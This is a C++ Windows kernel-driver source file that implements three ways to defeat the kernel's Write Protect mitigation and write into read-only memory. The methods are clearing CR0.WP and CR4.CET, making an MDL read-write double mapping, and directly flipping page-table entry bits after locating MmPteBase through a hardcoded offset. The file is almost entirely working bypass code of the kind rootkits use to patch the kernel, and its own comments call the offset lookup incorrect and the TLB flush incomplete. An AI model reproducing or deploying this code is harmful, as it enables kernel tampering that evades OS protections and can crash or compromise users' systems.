// ========================================================================
// File: WriteProtectBypass.cpp
//
// Author: winterknife
//
// Description: Source file that contains the necessary routines to bypass
// the Write Protect (WP) mitigation to allow supervisor-level procedures
// to write into read-only pages
//
// Modifications:
//  2026-05-12	Created
//  2026-05-23  Updated
// ========================================================================

// ========================================================================
// Includes
// ========================================================================

#include "../Inc/WriteProtectBypass.h"

// ========================================================================
// Routines
// ========================================================================

#pragma region ROUTINES

_Use_decl_annotations_
VOID __stdcall copy_memory_cr0_wp(
	VOID*       pDestination,
	CONST VOID* pcSource,
	DWORD_PTR   dwptrLength
) {
	// Init local variables
	DWORD dwCurrentProcessorNumber = 0;
	KAFFINITY kaffinityOld = 0;
	KIRQL kirqlOld = 0;
	QWORD qwCr4Value = 0;
	BOOLEAN bCetDisabled = false;
	QWORD qwCr0Value = 0;
	BOOLEAN bWpDisabled = false;

	// Get the current processor number
	dwCurrentProcessorNumber = KeGetCurrentProcessorNumber();

	// Set a processor affinity mask for the current thread
	// This will lock the current thread to the logical processor it is running on (CPU pinning)
	kaffinityOld = KeSetSystemAffinityThreadEx(__ll_lshift(0x1ULL, static_cast<int>(dwCurrentProcessorNumber)));

	// Raise the Interrupt Request Level (IRQL) of the current processor to the highest level
	// This will prevent the thread scheduler from preempting the current thread
	kirqlOld = KfRaiseIrql(HIGH_LEVEL);

	// Disable interrupts by clearing the RFLAGS.IF bit
	// This will prevent the current processor from servicing any maskable interrupts
	_disable(); // CLI - Clear Interrupt Flag

	// Read the CR4 register value
	qwCr4Value = __readcr4();

	// Clear the CR4.CET bit
	// CR0.WP cannot be cleared as long as CR4.CET is set
	// WARNING: HyperGuard / Secure Kernel Patch Guard (SKPG) intercepts writes to CR0 and CR4 registers
	bCetDisabled = _bittestandreset64(reinterpret_cast<LONG64*>(&qwCr4Value), 23LL);
	__writecr4(qwCr4Value);

	// Read the CR0 register value
	qwCr0Value = __readcr0();

	// Clear the CR0.WP bit
	// When clear, it allows kernel-mode code to write into read-only pages
	bWpDisabled = _bittestandreset64(reinterpret_cast<LONG64*>(&qwCr0Value), 16LL);
	__writecr0(qwCr0Value);

	// Write into RO pages
	__movsb(static_cast<PUCHAR>(pDestination), static_cast<UCHAR const*>(pcSource), dwptrLength);

	// Set the CR0.WP bit if it was cleared before
	// When set, it inhibits kernel-mode code from writing into read-only pages
	if (bWpDisabled) {
		_bittestandset64(reinterpret_cast<LONG64*>(&qwCr0Value), 16LL);
		__writecr0(qwCr0Value);
	}

	// Set the CR4.CET bit if it was cleared before
	// This flag can be set only if CR0.WP is set
	if (bCetDisabled) {
		_bittestandset64(reinterpret_cast<LONG64*>(&qwCr4Value), 23LL);
		__writecr4(qwCr4Value);
	}

	// Enable interrupts by setting the RFLAGS.IF bit
	_enable(); // STI - Set Interrupt Flag

	// Restore the original IRQL of the current processor
	KeLowerIrql(kirqlOld);

	// Restore the original processor affinity mask for the current thread
	KeRevertToUserAffinityThreadEx(kaffinityOld);
}

_Use_decl_annotations_
VOID __stdcall copy_memory_double_mapping(
	VOID*       pDestination,
	CONST VOID* pcSource,
	DWORD_PTR   dwptrLength
) {
	// Init local variables
	PMDL pMdl = nullptr;
	BOOLEAN bLocked = false;
	PVOID pBufferKva = nullptr;
	NTSTATUS status = STATUS_SUCCESS;

	// Allocate a MDL for the read-only destination memory block in KVAS
	pMdl = IoAllocateMdl(pDestination, static_cast<ULONG>(dwptrLength), false, false, nullptr);
	if (pMdl == nullptr) {
		goto cleanup;
	}

	// Lock the pages in the MDL
	__try {
		MmProbeAndLockPages(pMdl, KernelMode, IoReadAccess);
	} __except (EXCEPTION_EXECUTE_HANDLER) {
		goto cleanup;
	}

	bLocked = true;

	// Map the locked pages into KVAS effectively creating a second mapping of the same physical memory
	pBufferKva = MmMapLockedPagesSpecifyCache(pMdl, KernelMode, MmCached, nullptr, false, HighPagePriority | MdlMappingNoExecute);
	if (pBufferKva == nullptr) {
		goto cleanup;
	}

	// Set the protection type for the double mapping to RW
	status = MmProtectMdlSystemAddress(pMdl, PAGE_READWRITE);
	if (!NT_SUCCESS(status)) {
		goto cleanup;
	}

	// Write into RW pages
	// WARNING: If the code / data page is protected by HVCI / KDP then it will be marked as read-only in the SLAT entry
	__movsb(static_cast<PUCHAR>(pBufferKva), static_cast<UCHAR const*>(pcSource), dwptrLength);

	// Cleanup
cleanup:
	// Release the double mapping
	if (pBufferKva)
		MmUnmapLockedPages(pBufferKva, pMdl);

	// Unlock the pages in the MDL
	if (bLocked)
		MmUnlockPages(pMdl);

	// Release the MDL
	if (pMdl)
		IoFreeMdl(pMdl);
}

_Use_decl_annotations_
VOID __stdcall copy_memory_pte(
	VOID*       pDestination,
	CONST VOID* pcSource,
	DWORD_PTR   dwptrLength
) {
	// Init local variables
	PVOID pNtoskrnl = nullptr;
	PVOID pMmGetVirtualForPhysical = nullptr;
	DWORD dwOffsetImm64 = 0;
	QWORD qwMmPteBase = 0;
	PMMPTE_HARDWARE pMmpteHardwarePte = nullptr;
	PMMPTE_HARDWARE pMmpteHardwarePde = nullptr;
	PMMPTE_HARDWARE pMmpteHardwarePpe = nullptr;
	PMMPTE_HARDWARE pMmpteHardwarePxe = nullptr;
	KIRQL kirqlOld = 0;
	BOOLEAN bIrqlRaised = false;
	BOOLEAN bPdeReadWrite = false;
	BOOLEAN bPteReadWrite = false;

	// Check if the write will span a page boundary
	if (ADDRESS_AND_SIZE_TO_SPAN_PAGES(pDestination, dwptrLength) > 1) {
		goto cleanup;
	}

	// Get the nt image base address
	RtlPcToFileHeader(reinterpret_cast<PVOID>(RtlFindExportedRoutineByName), &pNtoskrnl);
	if (pNtoskrnl == nullptr) {
		goto cleanup;
	}

	// Get the KVA of nt!MmGetVirtualForPhysical
	pMmGetVirtualForPhysical = RtlFindExportedRoutineByName(pNtoskrnl, "MmGetVirtualForPhysical");
	if (pMmGetVirtualForPhysical == nullptr) {
		goto cleanup;
	}

	/*
	0: kd> uf nt!MmGetVirtualForPhysical
	nt!MmGetVirtualForPhysical:
	fffff803`8ec6e980 488bc1               mov rax,rcx
	fffff803`8ec6e983 48c1e80c             shr rax,0Ch
	fffff803`8ec6e987 488d1440             lea rdx,[rax+rax*2]
	fffff803`8ec6e98b 4803d2               add rdx,rdx
	fffff803`8ec6e98e 48b80800000080b1ffff mov rax,0FFFFB18000000008h
	fffff803`8ec6e998 488b04d0             mov rax,qword ptr [rax+rdx*8]
	fffff803`8ec6e99c 48c1e019             shl rax,19h
	fffff803`8ec6e9a0 48ba0000000080aeffff mov rdx,0FFFFAE8000000000h
	fffff803`8ec6e9aa 48c1e219             shl rdx,19h
	fffff803`8ec6e9ae 81e1ff0f0000         and ecx,0FFFh
	fffff803`8ec6e9b4 482bc2               sub rax,rdx
	fffff803`8ec6e9b7 48c1f810             sar rax,10h
	fffff803`8ec6e9bb 4803c1               add rax,rcx
	fffff803`8ec6e9be c3                   ret
	*/
	// This is not the correct way to find nt!MmPteBase, use nt!KdDebuggerDataBlock
	dwOffsetImm64 = 0x22UL;

	// Get the KVA of nt!MmPteBase
	// Starting from 64-bit Windows 10 1607 Anniversary Update (RS1) Build 14393, the PML4 table auto-entry index is randomized at boot time as part of KASLR (earlier, index fixed at 0x1ED)
	qwMmPteBase = *reinterpret_cast<PQWORD>(static_cast<PUCHAR>(pMmGetVirtualForPhysical) + dwOffsetImm64);

	// Compute the KVA of the PTE for the write address
	// BMI1 is only available since Haswell Intel microarchitecture (2013)
	/*
	0: kd> uf nt!MiGetPteAddress
	nt!MiGetPteAddress:
	fffff803`8ea376c0 48c1e909             shr rcx,9
	fffff803`8ea376c4 48b8f8ffffff7f000000 mov rax,7FFFFFFFF8h
	fffff803`8ea376ce 4823c8               and rcx,rax
	fffff803`8ea376d1 48b80000000080aeffff mov rax,0FFFFAE8000000000h
	fffff803`8ea376db 4803c1               add rax,rcx
	fffff803`8ea376de c3                   ret
	*/
	pMmpteHardwarePte = reinterpret_cast<PMMPTE_HARDWARE>(_andn_u64(0x7ULL, qwMmPteBase + __ull_rshift(__ll_lshift(reinterpret_cast<QWORD>(pDestination), 0x10), 0x19)));
	
	// Compute the KVA of the PDE for the write address
	/*
	0: kd> uf nt!MiGetPdeAddress
	nt!MiGetPdeAddress:
	fffff803`8ea12470 48c1e912             shr rcx,12h
	fffff803`8ea12474 81e1f8ffff3f         and ecx,3FFFFFF8h
	fffff803`8ea1247a 48b800000040d7aeffff mov rax,0FFFFAED740000000h
	fffff803`8ea12484 4803c1               add rax,rcx
	fffff803`8ea12487 c3                   ret
	*/
	pMmpteHardwarePde = reinterpret_cast<PMMPTE_HARDWARE>(_andn_u64(0x7ULL, qwMmPteBase + __ull_rshift(__ll_lshift(reinterpret_cast<QWORD>(pMmpteHardwarePte), 0x10), 0x19)));

	// Compute the KVA of the PDPTE for the write address
	pMmpteHardwarePpe = reinterpret_cast<PMMPTE_HARDWARE>(_andn_u64(0x7ULL, qwMmPteBase + __ull_rshift(__ll_lshift(reinterpret_cast<QWORD>(pMmpteHardwarePde), 0x10), 0x19)));

	// Compute the KVA of the PML4E for the write address
	pMmpteHardwarePxe = reinterpret_cast<PMMPTE_HARDWARE>(_andn_u64(0x7ULL, qwMmPteBase + __ull_rshift(__ll_lshift(reinterpret_cast<QWORD>(pMmpteHardwarePpe), 0x10), 0x19)));

	// Raise the Interrupt Request Level (IRQL) of the current processor to DISPATCH_LEVEL
	// This will prevent the thread scheduler from preempting the current thread
	kirqlOld = KeRaiseIrqlToDpcLevel();
	bIrqlRaised = true;

	// Check if the PML4E is valid
	if (!pMmpteHardwarePxe->Valid) {
		goto cleanup;
	}

	// Check if the PDPTE is valid
	if (!pMmpteHardwarePpe->Valid) {
		goto cleanup;
	}

	// Check if the PDE is valid
	if (!pMmpteHardwarePde->Valid) {
		goto cleanup;
	}

	// Check if the target page is mapped by a PDE (large page / 2 MB page)
	if (pMmpteHardwarePde->LargePage) {
		// Mark the target page as writable
		bPdeReadWrite = !_interlockedbittestandset64(reinterpret_cast<volatile LONG64*>(pMmpteHardwarePde), 1LL);
	}
	// Check if the target page is mapped by a PTE (normal page / 4 KB page)
	else if (pMmpteHardwarePte->Valid) {
		// Mark the target page as writable
		bPteReadWrite = !_interlockedbittestandset64(reinterpret_cast<volatile LONG64*>(pMmpteHardwarePte), 1LL);
	}
	else {
		goto cleanup;
	}

	// Invalidate any Translation Lookaside Buffer (TLB) entries for the target page
	// Remember to flush the TLB on all logical processors by sending an IPI
	__invlpg(pDestination); // INVLPG - Invalidate TLB Entries

	// Write into RW pages
	// WARNING: If the code / data page is protected by HVCI / KDP then it will be marked as read-only in the SLAT entry
	__movsb(static_cast<PUCHAR>(pDestination), static_cast<UCHAR const*>(pcSource), dwptrLength);

	// Clear the R/W flag (bit 1) in the PDE if it was set before
	if (bPdeReadWrite) {
		_interlockedbittestandreset64(reinterpret_cast<volatile LONG64*>(pMmpteHardwarePde), 1LL);
		
		// Whenever there is a write to a linear address, the processor sets the Dirty flag (bit 6) if it is not already set in the paging structure entry that maps the page
		_interlockedbittestandreset64(reinterpret_cast<volatile LONG64*>(pMmpteHardwarePde), 6LL);
	}

	// Clear the R/W flag (bit 1) in the PTE if it was set before
	if (bPteReadWrite) {
		_interlockedbittestandreset64(reinterpret_cast<volatile LONG64*>(pMmpteHardwarePte), 1LL);

		// Whenever there is a write to a linear address, the processor sets the Dirty flag (bit 6) if it is not already set in the paging structure entry that maps the page
		_interlockedbittestandreset64(reinterpret_cast<volatile LONG64*>(pMmpteHardwarePte), 6LL);
	}

	// Invalidate any Translation Lookaside Buffer (TLB) entries for the target page
	__invlpg(pDestination); // INVLPG - Invalidate TLB Entries

	// Cleanup
cleanup:
	// Restore the original IRQL of the current processor
	if (bIrqlRaised)
		KeLowerIrql(kirqlOld);
}

#pragma endregion